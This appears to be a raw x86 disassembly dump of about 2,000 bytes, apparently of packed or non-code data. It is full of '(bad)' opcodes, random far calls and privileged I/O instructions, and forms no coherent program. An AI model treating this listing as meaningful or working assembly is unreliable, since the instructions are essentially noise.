  417301:	mov    ebx,DWORD PTR [edx+0x2018292]
  417307:	add    ebp,esi
  417309:	adc    BYTE PTR es:[ebp+eax*8-0x1cc7a1cf],ah
  417311:	inc    edi
  417312:	push   edx
  417313:	pop    es
  417314:	inc    eax
  417315:	xchg   esi,eax
  417316:	xchg   esp,eax
  417317:	and    cl,BYTE PTR [edx-0x52c42bd0]
  41731d:	xor    eax,0xf372d99b
  417322:	dec    edi
  417323:	sbb    ecx,DWORD PTR [esi-0x79]
  417326:	fild   DWORD PTR [ebp+0x22]
  417329:	or     ecx,DWORD PTR [edi-0x4b49e4da]
  41732f:	jo     0x41732c
  417331:	bound  ebx,QWORD PTR [edx-0x191a1288]
  417337:	xchg   esi,eax
  417338:	sub    ebp,DWORD PTR [ebp+ebx*1-0x71fe35a]
  41733f:	pop    esi
  417340:	push   ebp
  417341:	adc    DWORD PTR [eax+0x6b],ebx
  417344:	add    BYTE PTR [ecx-0x63],0xc9
  417348:	pop    eax
  417349:	fidiv  WORD PTR [ebx]
  41734b:	mov    eax,ds:0x57fa29d1
  417350:	cmp    BYTE PTR [ebx-0x67a85b59],bh
  417356:	mov    ecx,0x37c63e3
  41735b:	fwait
  41735c:	sar    bh,1
  41735e:	pop    ecx
  41735f:	and    BYTE PTR [edx+0x45fee6bd],dh
  417365:	call   0x1756e1e9
  41736a:	cmp    DWORD PTR [ecx+eax*2-0x35],ebx
  41736e:	(bad)  
  41736f:	int3   
  417370:	pushf  
  417371:	fisubr DWORD PTR [ebp+0x2fe5b26a]
  417377:	mov    esi,0x879c499a
  41737c:	(bad)  
  41737d:	or     ebp,DWORD PTR [eax-0x75]
  417380:	cmp    eax,0x6b36e03
  417385:	fistp  WORD PTR [edx+0x51ca9b2]
  41738b:	shl    BYTE PTR [ebx+0x78],1
  41738e:	cli    
  41738f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417390:	je     0x41735e
  417392:	xor    ebp,DWORD PTR [ecx]
  417394:	cmp    bl,BYTE PTR ds:[ebp+0x379fb25b]
  41739b:	mov    ch,0xdb
  41739d:	jl     0x4173a8
  41739f:	cmp    al,BYTE PTR [ecx+0xb]
  4173a2:	sahf   
  4173a3:	xchg   ebp,eax
  4173a4:	mov    ah,0x64
  4173a6:	xor    DWORD PTR [edx+0x2bb4d67e],ebp
  4173ac:	jo     0x4173e5
  4173ae:	fwait
  4173af:	das    
  4173b0:	jge    0x4173a1
  4173b2:	xchg   edx,eax
  4173b3:	push   0x6e
  4173b5:	pushf  
  4173b6:	ret    0x7aa7
  4173b9:	js     0x417385
  4173bb:	stos   BYTE PTR es:[edi],al
  4173bc:	jb     0x4173e5
  4173be:	push   cs
  4173bf:	xor    DWORD PTR [edx-0x74c69727],0xdd1acc00
  4173c9:	or     esp,DWORD PTR [ebp+edx*1+0x5be0f04c]
  4173d0:	xor    eax,0x5e949a2a
  4173d5:	adc    esi,DWORD PTR [ebx+0x67]
  4173d8:	push   ss
  4173d9:	ins    DWORD PTR es:[edi],dx
  4173da:	aad    0xd6
  4173dc:	mov    al,0xb
  4173de:	sahf   
  4173df:	adc    eax,0xc38b2e3b
  4173e4:	jo     0x417452
  4173e6:	call   0xfb7f:0x7ad5636d
  4173ed:	mov    edx,0x8cf5a751
  4173f2:	or     ch,ch
  4173f4:	not    DWORD PTR [edx-0x3c]
  4173f7:	push   ebp
  4173f8:	mov    ch,0xb0
  4173fa:	jmp    0x4173aa
  4173fc:	or     ah,BYTE PTR [edi+0x4a]
  4173ff:	daa    
  417400:	out    0x8a,eax
  417402:	arpl   WORD PTR [eax+0x15d0c87e],bp
  417408:	mov    dl,0xb5
  41740a:	and    DWORD PTR [esp+eax*2-0x7b],eax
  41740e:	call   0xd09e:0xd495c896
  417415:	add    ecx,DWORD PTR [ebx-0x145bde59]
  41741b:	ins    BYTE PTR es:[edi],dx
  41741c:	or     DWORD PTR es:[eax-0x67],esp
  417420:	lea    edx,ds:0x965ebac3
  417426:	sbb    dh,BYTE PTR [edx-0x4e36c2fb]
  41742c:	retf   
  41742d:	or     edx,DWORD PTR [edx+0xa]
  417430:	fcomp  DWORD PTR [ecx+eiz*8]
  417433:	ret    
  417434:	outs   dx,DWORD PTR ds:[esi]
  417435:	arpl   WORD PTR [ecx+0xc0b6cc2],sp
  41743b:	cvtps2pd xmm3,QWORD PTR fs:[edi+0x63]
  417440:	jmp    0x1ae8:0x49b35002
  417447:	retf   
  417448:	into   
  417449:	push   0x94ad08ca
  41744e:	sub    DWORD PTR [edx+esi*4-0x72f9f605],edx
  417455:	add    bh,BYTE PTR [ecx-0x59]
  417458:	cwde   
  417459:	into   
  41745a:	bound  ebx,QWORD PTR [esi+edx*4-0x4d561087]
  417461:	loope  0x417488
  417463:	das    
  417464:	mov    ds:0x3b5cfa42,eax
  417469:	or     edx,DWORD PTR [edi+ebp*4]
  41746c:	dec    cx
  41746e:	cdq    
  41746f:	enter  0xdcb0,0x9a
  417473:	adc    bl,BYTE PTR [ecx]
  417475:	lea    edi,[ecx+0x8]
  417478:	ins    BYTE PTR es:[edi],dx
  417479:	stc    
  41747a:	pop    esi
  41747b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747c:	adc    ebp,DWORD PTR [esi]
  41747e:	cmp    cl,BYTE PTR [esi-0x577a27bc]
  417484:	mov    ch,0x2
  417486:	push   0x28
  417488:	(bad)  
  417489:	xor    DWORD PTR [edx-0x50],ebp
  41748c:	mov    ah,0x7d
  41748e:	pop    edi
  41748f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417490:	jno    0x4174be
  417492:	clc    
  417493:	mov    WORD PTR gs:[edx+edx*4],cs
  417497:	push   esp
  417498:	mov    BYTE PTR [ebp+0x22],ah
  41749b:	fsubr  QWORD PTR [esi+0x7d199368]
  4174a1:	aam    0x6
  4174a3:	inc    edi
  4174a4:	xchg   ecx,eax
  4174a5:	sub    esi,DWORD PTR [eax]
  4174a7:	call   0xa7d52fe1
  4174ac:	push   ss
  4174ad:	mov    eax,0xec7dd1b4
  4174b2:	loop   0x4174ce
  4174b4:	mov    WORD PTR [ecx-0x5e],?
  4174b7:	daa    
  4174b8:	pop    ecx
  4174b9:	rol    BYTE PTR [eax-0x49a4bcf6],cl
  4174bf:	mov    al,ds:0x9d15f085
  4174c4:	jge    0x417451
  4174c6:	cli    
  4174c7:	mov    bl,0x71
  4174c9:	mov    bl,0x9a
  4174cb:	(bad)  
  4174cc:	xchg   edi,eax
  4174cd:	repz mov ebx,0x77ce2b5e
  4174d3:	pop    ebx
  4174d4:	pop    ebx
  4174d5:	or     ebp,DWORD PTR [esi-0x38ea9cce]
  4174db:	mov    BYTE PTR [ecx],dh
  4174dd:	xchg   ebp,eax
  4174de:	mov    esi,0x9a1b03cf
  4174e3:	ds aaa 
  4174e5:	sub    ebx,esi
  4174e7:	xor    eax,0xb2270bff
  4174ec:	jmp    0x4723703d
  4174f1:	inc    esp
  4174f2:	mov    al,ds:0x118e1208
  4174f7:	cmp    esi,ebx
  4174f9:	xchg   esp,eax
  4174fa:	pop    edx
  4174fb:	dec    eax
  4174fc:	inc    edi
  4174fd:	mov    ebx,0x5b04a763
  417502:	jmp    0xb7e3:0xcdc40fe5
  417509:	jl     0x41749f
  41750b:	outs   dx,DWORD PTR ds:[esi]
  41750c:	lahf   
  41750d:	xor    ebx,DWORD PTR [ebx]
  41750f:	mov    dh,0x23
  417511:	sub    DWORD PTR [esi+0x39],esi
  417514:	xor    BYTE PTR [ebx],cl
  417516:	sbb    ebx,DWORD PTR [ecx+0x3a5f4814]
  41751c:	jl     0x417537
  41751e:	call   0x7435:0xf3443798
  417525:	call   0x231a:0x56549f01
  41752c:	(bad)  
  41752e:	adc    edi,DWORD PTR [edx-0x5b656804]
  417534:	dec    edx
  417535:	mov    ah,0x3f
  417537:	jg     0x41756b
  417539:	push   cs
  41753a:	sub    DWORD PTR [ecx-0x58a44983],ecx
  417540:	in     eax,0x64
  417542:	and    DWORD PTR [eax+0x27],0xffffffd1
  417546:	call   0x130c:0xf4e6a501
  41754d:	scas   eax,DWORD PTR es:[edi]
  41754e:	sbb    al,BYTE PTR [ecx-0x585c3107]
  417554:	fdivrp st(7),st
  417556:	fstp   QWORD PTR [esi]
  417558:	xor    BYTE PTR [edi-0x384e25f6],bl
  41755e:	ss adc al,0x92
  417561:	bound  esi,QWORD PTR ds:0x2efd5c57
  417567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417568:	jbe    0x417572
  41756a:	sub    ch,BYTE PTR [edx]
  41756c:	cwde   
  41756d:	add    al,0xad
  41756f:	push   es
  417570:	inc    eax
  417571:	push   cs
  417572:	call   0x9a8e:0xdd666796
  417579:	add    DWORD PTR [edx-0x59],ecx
  41757c:	pop    edx
  41757d:	icebp  
  41757e:	jmp    0x41758d
  417580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417581:	iret   
  417582:	fbstp  TBYTE PTR [edx+0x7b9b009]
  417589:	ins    DWORD PTR es:[edi],dx
  41758a:	push   esp
  41758b:	xchg   esp,eax
  41758c:	pop    ebx
  41758d:	or     edi,DWORD PTR [eax+0x6b]
  417590:	(bad)  
  417591:	fs lock add ecx,DWORD PTR ss:[eax]
  417596:	call   0x9681:0x740ae095
  41759d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41759e:	popa   
  41759f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175a0:	sub    al,0xd2
  4175a2:	ja     0x41757e
  4175a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175a5:	lea    eax,[edi+edx*2-0x2e]
  4175a9:	hlt    
  4175aa:	jp     0x4175bc
  4175ac:	mov    dl,0xd
  4175ae:	or     BYTE PTR [ecx+0x66],dh
  4175b1:	xchg   DWORD PTR [ecx],esi
  4175b3:	jbe    0x41754b
  4175b5:	or     ecx,DWORD PTR [ecx+0x3d]
  4175b8:	cmp    esi,DWORD PTR [ecx-0x15e42205]
  4175be:	call   0x9f1b:0x8c4604ed
  4175c5:	jmp    DWORD PTR ss:[edi-0x5c6adf3f]
  4175cc:	xchg   BYTE PTR [esi-0x2e4d071f],dh
  4175d2:	icebp  
  4175d3:	jns    0x417556
  4175d5:	mov    dl,0x41
  4175d7:	inc    esp
  4175d8:	or     bx,WORD PTR [edx*4+0x35d80c58]
  4175e0:	out    dx,al
  4175e1:	aam    0x6f
  4175e3:	xchg   DWORD PTR [ecx],esp
  4175e5:	jle    0x417649
  4175e7:	data16 mov dl,0x9f
  4175ea:	add    cl,BYTE PTR [edi]
  4175ec:	ja     0x417651
  4175ee:	shl    DWORD PTR [esi-0x64ac8a55],cl
  4175f4:	or     ebp,edx
  4175f6:	call   0x4622:0xe0f37525
  4175fd:	jne    0x417599
  4175ff:	pop    ebp
  417600:	sub    DWORD PTR [ecx-0x80],eax
  417603:	mov    dl,0xe1
  417605:	jae    0x417663
  417607:	nop
  417608:	fwait
  417609:	mov    esp,0x8b8c87a8
  41760e:	aas    
  41760f:	and    eax,0x7e00b5a5
  417614:	mov    dl,0x4f
  417616:	xchg   edi,eax
  417617:	dec    esi
  417618:	add    DWORD PTR [eax-0x31],eax
  41761b:	inc    ebx
  41761c:	xchg   esp,eax
  41761d:	or     ecx,ebp
  41761f:	mov    ch,0x23
  417621:	test   al,0xd8
  417623:	fsin   
  417625:	sbb    BYTE PTR [edx+0x61721f00],bl
  41762b:	push   0xffffffa7
  41762d:	xchg   esi,eax
  41762e:	cmp    BYTE PTR [edi+0x2323788f],ah
  417634:	out    dx,eax
  417635:	loope  0x417642
  417637:	sub    dh,BYTE PTR [edx-0x7dbe2770]
  41763d:	and    dl,BYTE PTR [ecx]
  41763f:	xchg   esp,eax
  417640:	push   ebp
  417641:	cmc    
  417642:	xchg   DWORD PTR [edi-0x377e2faa],esp
  417648:	loopne 0x4176b0
  41764a:	pop    edi
  41764b:	cmp    DWORD PTR [edx-0x4bf7ac38],esi
  417651:	mov    eax,0xb9d5c56
  417656:	aas    
  417657:	scas   eax,DWORD PTR es:[edi]
  417658:	fdivp  st(1),st
  41765a:	and    al,0x7e
  41765c:	lods   al,BYTE PTR ds:[esi]
  41765d:	pusha  
  41765e:	xchg   ecx,eax
  41765f:	and    al,0x47
  417661:	xchg   ecx,eax
  417662:	lds    esp,FWORD PTR [eax+ebp*8]
  417665:	jno    0x417612
  417667:	outs   dx,DWORD PTR ds:[esi]
  417668:	mov    ds:0x38a70118,eax
  41766d:	xchg   BYTE PTR [eax-0x6dd37646],al
  417673:	or     esi,DWORD PTR [edx+0x7f3b5bb9]
  417679:	mov    edx,0x7ee1f2c3
  41767e:	rcr    BYTE PTR [edi-0x2a],0xb
  417682:	ret    0xa713
  417685:	xchg   ecx,eax
  417686:	inc    ebp
  417687:	loopne 0x4176d1
  417689:	sbb    BYTE PTR [edx+0xfede572],bl
  41768f:	test   eax,0xa753acb0
  417694:	push   ebp
  417695:	sub    eax,0x599b2490
  41769a:	jbe    0x4176b0
  41769c:	mov    dl,0x3b
  41769e:	lods   al,BYTE PTR ds:[esi]
  41769f:	cmp    BYTE PTR [esi],0xb4
  4176a2:	pop    ebx
  4176a3:	(bad)
  4176a7:	out    dx,al
  4176a8:	push   eax
  4176a9:	or     al,0x9a
  4176ab:	int3   
  4176ac:	mov    esi,0x9a7b2e06
  4176b1:	mov    al,ds:0xc0b22517
  4176b6:	jmp    0x3768:0xb9abbad5
  4176bd:	cld    
  4176be:	push   0xffffff8f
  4176c0:	inc    esp
  4176c1:	or     al,0x1c
  4176c3:	dec    eax
  4176c4:	push   ebp
  4176c5:	and    bl,BYTE PTR [edi-0x29]
  4176c8:	inc    edi
  4176c9:	cmc    
  4176ca:	outs   dx,BYTE PTR ds:[esi]
  4176cb:	pop    edx
  4176cc:	lea    edi,[edx]
  4176ce:	(bad)  
  4176cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d0:	stos   BYTE PTR es:[edi],al
  4176d1:	pop    ss
  4176d2:	pop    edx
  4176d3:	inc    esi
  4176d4:	prefetcht2 BYTE PTR [esi]
  4176d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d8:	push   esi
  4176d9:	jno    0x417743
  4176db:	neg    DWORD PTR ds:[esi+0x6d]
  4176df:	add    DWORD PTR [edx-0x4bb750c6],esi
  4176e5:	xor    BYTE PTR [edx],bl
  4176e7:	inc    ebp
  4176e8:	sub    bh,ah
  4176ea:	or     ah,BYTE PTR [ebp-0x4e8246f3]
  4176f0:	pop    ebx
  4176f1:	lock js 0x417755
  4176f4:	shl    BYTE PTR [edx-0x4e],cl
  4176f7:	popa   
  4176f8:	mov    esp,0x9614370f
  4176fd:	lods   al,BYTE PTR ds:[esi]
  4176fe:	imul   ebp,DWORD PTR [ebx-0x31509c0e],0xa7f8efdc
  417708:	into   
  417709:	ret    
  41770a:	fistp  DWORD PTR [ecx]
  41770c:	mov    esp,0x54a23efa
  417711:	pop    ss
  417712:	popf   
  417713:	test   BYTE PTR [ecx-0x5c38a4cc],cl
  417719:	jns    0x4176ea
  41771b:	mov    bh,0xc2
  41771d:	jae    0x41774b
  41771f:	test   al,0xf
  417721:	fcom   DWORD PTR [ecx-0x781e8df7]
  417727:	shl    dl,1
  417729:	sbb    BYTE PTR [edx+0x776ba8fa],0xe8
  417730:	add    BYTE PTR [edx+eax*4],0xa7
  417734:	mov    bh,0x24
  417736:	loop   0x4177a4
  417738:	jbe    0x417708
  41773a:	std    
  41773b:	xor    ch,BYTE PTR [ebp+esi*8+0x53752fce]
  417742:	ja     0x41772b
  417744:	jb     0x417745
  417746:	test   cl,ah
  417748:	inc    ecx
  417749:	or     ebx,DWORD PTR [eax-0x1c]
  41774c:	ins    BYTE PTR es:[edi],dx
  41774d:	cmp    esp,edi
  41774f:	(bad)  
  417750:	rcl    BYTE PTR [edi],1
  417752:	jmp    0xf31f:0x6820b281
  417759:	cmc    
  41775a:	das    
  41775b:	sub    eax,0xa79bf7c7
  417760:	inc    edi
  417761:	retf   0xadeb
  417764:	push   ds
  417765:	scas   al,BYTE PTR es:[edi]
  417766:	sub    BYTE PTR [edx-0x3c],bh
  417769:	sbb    DWORD PTR [edx+0x4a3d2b46],ebx
  41776f:	hlt    
  417770:	hlt    
  417771:	shl    DWORD PTR [eax],1
  417773:	(bad)  
  417774:	fdivr  DWORD PTR [ebx+0x16]
  417777:	daa    
  417778:	or     cl,0xd0
  41777b:	loopne 0x417730
  41777d:	pusha  
  41777e:	pop    es
  41777f:	dec    ebp
  417780:	enter  0x4f7c,0x1a
  417784:	pop    edx
  417785:	mov    cl,0xd4
  417787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417788:	out    dx,al
  417789:	mov    esp,DWORD PTR [edi+0x2ca53a3e]
  41778f:	stos   DWORD PTR es:[edi],eax
  417790:	mov    dl,0x2a
  417792:	jmp    0xe5fc1ad8
  417797:	and    al,0xb8
  417799:	pushf  
  41779a:	loop   0x4177fa
  41779c:	mov    cl,0xf2
  41779e:	xchg   ebp,eax
  41779f:	xchg   ebp,eax
  4177a0:	mov    dh,0x41
  4177a2:	retf   0xca1f
  4177a5:	and    esi,DWORD PTR ds:0xab310a6
  4177ab:	xlat   BYTE PTR fs:[ebx]
  4177ad:	shl    BYTE PTR [ecx+0x53],1
  4177b0:	ds cmp edx,ebp
  4177b3:	scas   al,BYTE PTR es:[edi]
  4177b4:	mov    dl,0xee
  4177b6:	mov    bh,0xda
  4177b8:	xor    ah,al
  4177ba:	add    eax,0xe20bb547
  4177bf:	xchg   ecx,eax
  4177c0:	or     edx,DWORD PTR [edx+0x61]
  4177c3:	push   cs
  4177c4:	adc    ebp,DWORD PTR [ecx+edx*4-0x412bcdc4]
  4177cb:	and    al,0xfd
  4177cd:	aas    
  4177ce:	jno    0x4177e7
  4177d0:	pop    edx
  4177d1:	bound  eax,QWORD PTR [esi+0x5c7804a7]
  4177d7:	mov    eax,ds:0xc56f7fe7
  4177dc:	mov    cl,0xc4
  4177de:	cs loopne 0x41780e
  4177e1:	test   edi,esi
  4177e3:	pop    edi
  4177e4:	push   0xe6a7c927
  4177e9:	push   es
  4177ea:	in     eax,dx
  4177eb:	in     al,0x14
  4177ed:	rcl    BYTE PTR [ebx-0x484b4dba],1
  4177f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177f5:	push   cs
  4177f6:	addr16 mov dh,0x6b
  4177f9:	jp     0x41781d
  4177fb:	shl    al,cl
  4177fd:	or     edx,DWORD PTR [esp+eax*8+0x1b1c7026]
  417804:	mov    WORD PTR [ebp+0x580da29a],fs
  41780a:	push   0xb5b5e5cc
  41780f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417810:	(bad)  
  417811:	jmp    0x3d052549
  417816:	mov    esi,0xa3570a6c
  41781b:	push   DWORD PTR [ecx+0x5df55a7]
  417821:	adc    ebp,DWORD PTR [eax-0x53baa0f9]
  417827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417828:	push   0x65
  41782a:	enter  0xa0ce,0x11
  41782e:	jo     0x4177bd
  417830:	mov    dl,0x82
  417832:	mov    dl,0xd5
  417834:	or     cl,BYTE PTR [eax+0xf2781e6]
  41783a:	loopne 0x41787c
  41783c:	add    ecx,ecx
  41783e:	xchg   DWORD PTR [ebx-0x21],esp
  417841:	mov    esi,DWORD PTR [eax+edx*8]
  417844:	inc    edi
  417845:	and    eax,0x95cde895
  41784a:	xchg   esp,eax
  41784b:	(bad)  
  41784c:	lea    edi,[esi+0xbe01ef0]
  417852:	outs   dx,BYTE PTR ds:[esi]
  417853:	loop   0x41780c
  417855:	sbb    bl,BYTE PTR [ebx+0x7a]
  417858:	or     BYTE PTR [edx-0x66],dl
  41785b:	pop    eax
  41785c:	mov    edi,0x614cb65e
  417861:	or     al,0x40
  417863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417864:	add    DWORD PTR [ebx-0x73],edx
  417867:	sub    eax,0xcfc8e317
  41786c:	(bad)  
  41786d:	adc    BYTE PTR [edx+0x2e379136],bl
  417873:	jne    0x417873
  417875:	ins    DWORD PTR es:[edi],dx
  417876:	test   eax,0x94e2839a
  41787b:	pop    esp
  41787c:	aad    0xe9
  41787e:	fimul  DWORD PTR [eax+0x1603c927]
  417884:	mov    ch,0x7c
  417886:	xchg   edx,eax
  417887:	xlat   BYTE PTR ds:[ebx]
  417888:	out    0xbd,eax
  41788a:	fstp   TBYTE PTR [ecx+0x63]
  41788d:	pusha  
  41788e:	out    0x41,ax
  417891:	jmp    0x41787a
  417893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417894:	test   DWORD PTR [eax+esi*8+0x59],esi
  417898:	xor    eax,0xb2505221
  41789d:	push   ecx
  41789e:	push   DWORD PTR [eax]
  4178a0:	ja     0x4178f1
  4178a2:	xchg   ecx,eax
  4178a3:	int3   
  4178a4:	pusha  
  4178a5:	or     edi,DWORD PTR [ecx+0x15]
  4178a8:	jno    0x4178cf
  4178aa:	scas   eax,DWORD PTR es:[edi]
  4178ab:	das    
  4178ac:	cmp    al,0xad
  4178ae:	call   0x22d4:0xdf0ec6d0
  4178b5:	dec    ecx
  4178b6:	xchg   edx,eax
  4178b7:	lahf   
  4178b8:	and    eax,0xafe18704
  4178bd:	aad    0xc8
  4178bf:	arpl   WORD PTR [bp+si],bp
  4178c2:	ja     0x4178c5
  4178c4:	sbb    eax,0xf6609aba
  4178c9:	sub    ecx,ebp
  4178cb:	ret    
  4178cc:	leave  
  4178cd:	xor    eax,0x520cb92d
  4178d2:	shl    edi,cl
  4178d4:	push   edi
  4178d5:	das    
  4178d6:	rol    BYTE PTR [edx],1
  4178d8:	outs   dx,DWORD PTR ds:[esi]
  4178d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178da:	jg     0x417957
  4178dc:	mov    cl,ah
  4178de:	fwait
  4178df:	dec    edi
  4178e0:	jecxz  0x4178c7
  4178e2:	rol    BYTE PTR [edi+eiz*4],cl
  4178e5:	out    0x62,eax
  4178e7:	pop    ebx
  4178e8:	xchg   ebp,eax
  4178e9:	or     edx,DWORD PTR [ecx-0x26209407]
  4178ef:	cdq    
  4178f0:	aam    0x72
  4178f2:	call   0x75fd:0x96b85db5
  4178f9:	je     0x41792c
  4178fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178fc:	js     0x4178c5
  4178fe:	retf   
  4178ff:	push   eax
  417900:	loopne 0x417950
  417902:	pop    edx
  417903:	xlat   BYTE PTR ds:[ebx]
  417904:	mov    al,0x21
  417906:	dec    ecx
  417907:	loope  0x41797c
  417909:	ficom  DWORD PTR [eax-0x1a94b19]
  41790f:	jmp    0x4178d0
  417911:	scas   eax,DWORD PTR es:[edi]
  417912:	call   0x2997:0x9f6031e
  417919:	call   FWORD PTR [edx-0x16819a33]
  41791f:	mov    es,WORD PTR [edi-0x57]
  417922:	sahf   
  417923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417924:	mov    ?,ebx
  417926:	neg    dl
  417928:	loopne 0x4178eb
  41792a:	and    DWORD PTR [edx+esi*4+0x60],edi
  41792e:	les    ebx,FWORD PTR [eax+0x48]
  417931:	sub    dl,al
  417933:	add    edi,esp
  417935:	cmc    
  417936:	dec    edi
  417937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417938:	rol    dl,1
  41793a:	repz mov al,0xcc
  41793d:	jnp    0x4178d6
  41793f:	js     0x4178f3
  417941:	mov    ds:0x4453f26e,eax
  417946:	loop   0x417913
  417948:	inc    ecx
  417949:	or     esi,DWORD PTR [ebx-0x5741293e]
  41794f:	push   edx
  417950:	ja     0x4179c3
  417952:	pusha  
  417953:	mov    WORD PTR [ebx+0xde9b943],?
  417959:	pop    ebx
  41795a:	xor    BYTE PTR [esi+0x5e],0x0
  41795e:	adc    BYTE PTR [ebp-0x64654cf9],bl
  417964:	test   eax,0x3f31a3c2
  417969:	fwait
  41796a:	call   0xf7d:0xa05031f6
  417971:	test   BYTE PTR [edi+0x2b0be137],ch
  417977:	loope  0x4179c6
  417979:	js     0x417903
  41797b:	xor    edi,DWORD PTR [edi-0x2]
  41797e:	pushf  
  41797f:	aaa    
  417980:	je     0x417955
  417982:	fwait
  417983:	mov    cl,0x60
  417985:	or     esp,DWORD PTR [eax]
  417987:	push   esp
  417988:	or     esp,ebx
  41798a:	cmp    bl,0xae
  41798d:	cwde   
  41798e:	popf   
  41798f:	outs   dx,BYTE PTR ds:[esi]
  417990:	fld    DWORD PTR ds:0xd5c20ba6
  417996:	mov    dh,0x44
  417998:	jno    0x4179a4
  41799a:	mov    dl,0x71
  41799c:	ja     0x417a05
  41799e:	mov    ebp,0xb02b1638
  4179a3:	js     0x417957
  4179a5:	and    eax,0xc6c35006
  4179aa:	(bad)
  4179ae:	mov    dl,0xa3
  4179b0:	cmp    esi,ebx
  4179b2:	xchg   ebp,eax
  4179b3:	and    bh,BYTE PTR [eax-0x35]
  4179b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179b7:	mov    eax,ds:0x1c999a69
  4179bc:	neg    cl
  4179be:	mov    ebp,0xe280d63e
  4179c3:	das    
  4179c4:	aam    0x49
  4179c6:	jle    0x417962
  4179c8:	scas   eax,DWORD PTR es:[edi]
  4179c9:	mov    edx,0x4e62869a
  4179ce:	scas   al,BYTE PTR es:[edi]
  4179cf:	call   0x8bf6:0x39a20152
  4179d6:	hlt    
  4179d7:	(bad)  
  4179d8:	jmp    FWORD PTR [esi]
  4179da:	jg     0x4179af
  4179dc:	ror    BYTE PTR [ebx],cl
  4179de:	xchg   esp,eax
  4179df:	fist   WORD PTR [ebx-0x18bf96a0]
  4179e5:	std    
  4179e6:	cdq    
  4179e7:	push   cs
  4179e8:	jmp    0xc1b3826d
  4179ed:	fucomi st,st(0)
  4179ef:	lock inc ebx
  4179f1:	push   ss
  4179f2:	arpl   WORD PTR [eax],bx
  4179f4:	mov    cl,0x8a
  4179f6:	das    
  4179f7:	inc    eax
  4179f8:	les    edx,FWORD PTR [edi+0x745a276e]
  4179fe:	push   esp
  4179ff:	sbb    edx,eax
  417a01:	dec    edi
  417a02:	fist   WORD PTR [ebx-0x69]
  417a05:	or     eax,DWORD PTR ds:0x38296908
  417a0b:	out    dx,al
  417a0c:	jnp    0x417a5b
  417a0e:	mov    ds:0x528b49cb,eax
  417a13:	data16 add bh,cl
  417a16:	(bad)  
  417a17:	aad    0xee
  417a19:	or     edx,esi
  417a1b:	mov    bl,0x59
  417a1d:	sti    
  417a1e:	ss sbb DWORD PTR ss:[ecx-0x36c53666],esi
  417a26:	push   ebx
  417a27:	xchg   ecx,eax
  417a28:	das    
  417a29:	out    dx,eax
  417a2a:	add    eax,0xb5ed6ca7
  417a2f:	inc    edx
  417a30:	js     0x417a44
  417a32:	fcomp  st(4)
  417a34:	dec    esi
  417a35:	mov    ah,0x9a
  417a37:	xchg   BYTE PTR [edi+0x2257dd9f],al
  417a3d:	arpl   WORD PTR [edi+eiz*4+0x73937b47],bp
  417a44:	jae    0x417a7b
  417a46:	jne    0x417a42
  417a48:	pushf  
  417a49:	adc    cl,bl
  417a4b:	fs mov dl,0x86
  417a4e:	ret    0xfbf2
  417a51:	test   eax,0x395ea763
  417a56:	add    al,0xcd
  417a58:	sbb    DWORD PTR [edi-0x2aa3fe73],esp
  417a5e:	call   0x5084:0xdf45ec7a
  417a65:	mov    edx,0xc5a2a788
  417a6a:	dec    esp
  417a6b:	retf   
  417a6c:	cmp    eax,0xb22b0897
  417a71:	jg     0x417aa2
  417a73:	das    
  417a74:	(bad)  
  417a76:	test   esi,esp
  417a78:	test   DWORD PTR [ebx],0xece31ed1
  417a7e:	xchg   edx,eax
  417a7f:	push   0x1da2d8c0
  417a84:	cwde   
  417a85:	or     esi,DWORD PTR ds:0xcea20226
  417a8b:	in     eax,0x18
  417a8d:	ja     0x417abe
  417a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a90:	dec    ebx
  417a91:	xchg   esi,eax
  417a92:	push   edi
  417a93:	pop    eax
  417a94:	mov    al,ds:0x6d4b16e3
  417a99:	mov    ds,WORD PTR [edx+0x3ef36637]
  417a9f:	mov    ds:0x69e975ad,eax
  417aa4:	add    BYTE PTR [edi+0x734ff85a],ah
  417aaa:	retf   0xca59
  417aad:	pop    edx
  417aae:	cdq    
  417aaf:	loope  0x417a78
  417ab1:	mov    ch,0xf1
  417ab3:	es inc edi
  417ab5:	fwait
  417ab6:	mov    bl,0x90
  417ab8:	scas   eax,DWORD PTR es:[edi]
  417ab9:	or     eax,DWORD PTR ds:0x26e0e56c
  417abf:	ja     0x417a76
  417ac1:	jge    0x417a5c
  417ac3:	icebp  
  417ac4:	sub    ch,0xfc
  417ac7:	pushf  
  417ac8:	push   0xffffffac
  417aca:	push   0xffffffb4
  417acc:	adc    dh,BYTE PTR [edi]
  417ace:	frstor [edi-0x612cac6b]
  417ad4:	add    BYTE PTR [ebx+0x74],ah
  417ad7:	jb     0x417a8b
  417ad9:	test   BYTE PTR [edi],ah
  417adb:	call   0xef50:0x7853662d
  417ae2:	xchg   ebx,eax
  417ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae4:	push   cs
  417ae5:	mov    eax,0x618e6f42
  417aea:	hlt    
  417aeb:	(bad)  [edx+0x1f862e3e]
  417af1:	adc    WORD PTR [esi],sp
  417af4:	outs   dx,BYTE PTR ds:[esi]
  417af5:	or     al,0x34
